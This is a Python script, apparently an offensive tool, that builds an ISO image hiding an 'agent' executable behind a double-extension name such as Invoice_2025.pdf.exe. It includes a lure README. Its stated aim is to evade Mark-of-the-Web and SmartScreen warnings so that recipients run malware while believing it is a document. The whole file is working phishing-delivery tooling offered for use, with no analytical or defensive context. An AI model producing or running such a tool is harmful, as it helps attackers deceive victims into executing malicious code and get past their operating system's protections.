#!/usr/bin/env python3
"""
ISO Payload Generator - MOTW Bypass (Simple & Reliable)

Just puts the EXE in the ISO with a double extension.
Windows hides .exe by default, so user sees "Invoice.pdf" but it's actually .pdf.exe

No SmartScreen because files inside ISO don't have Mark-of-the-Web!
"""

import os
import sys
import shutil
import tempfile
import subprocess
import argparse


def create_iso_payload(agent_path: str, output_iso: str, 
                       display_name: str = "Invoice_2025.pdf",
                       icon_type: str = "pdf"):
    """
    Create ISO with agent EXE using double extension trick.
    """
    
    # Ensure display_name has double extension (.pdf.exe, .docx.exe, etc)
    if not display_name.lower().endswith('.exe'):
        ext_map = {
            'pdf': '.pdf.exe',
            'doc': '.docx.exe', 
            'xls': '.xlsx.exe',
            'ppt': '.pptx.exe',
            'txt': '.txt.exe',
        }
        ext = ext_map.get(icon_type, '.pdf.exe')
        if display_name.lower().endswith(('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt')):
            display_name += '.exe'
        else:
            display_name += ext
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Copy agent with double extension name
        agent_dest = os.path.join(tmpdir, display_name)
        shutil.copy2(agent_path, agent_dest)
        
        # Optional readme
        readme = os.path.join(tmpdir, "README.txt")
        with open(readme, 'w') as f:
            f.write("Please open the document file to view the contents.\n")
        
        # Build ISO
        iso_cmd = [
            'genisoimage',
            '-o', output_iso,
            '-V', 'DOCUMENTS',
            '-J', '-joliet-long', '-r',
            '-input-charset', 'utf-8',
            tmpdir
        ]
        
        result = subprocess.run(iso_cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"[!] ISO Error: {result.stderr}")
            return False
        
        size_mb = os.path.getsize(output_iso) / 1024 / 1024
        visible_name = display_name.rsplit('.exe', 1)[0]
        print(f"[+] Created ISO: {output_iso}")
        print(f"    File: {display_name}")
        print(f"    User sees: {visible_name}")
        print(f"    Size: {size_mb:.1f} MB")
        
        return True


def main():
    parser = argparse.ArgumentParser(description='ISO Payload Generator - MOTW Bypass')
    parser.add_argument('agent', help='Path to agent EXE')
    parser.add_argument('-o', '--output', default='payload.iso', help='Output ISO')
    parser.add_argument('-n', '--name', default='Invoice_2025.pdf', help='Display name')
    parser.add_argument('-t', '--type', default='pdf', choices=['pdf', 'doc', 'xls', 'ppt', 'txt'])
    
    args = parser.parse_args()
    
    if not os.path.exists(args.agent):
        print(f"[!] Agent not found: {args.agent}")
        sys.exit(1)
    
    create_iso_payload(args.agent, args.output, args.name, args.type)


if __name__ == '__main__':
    main()
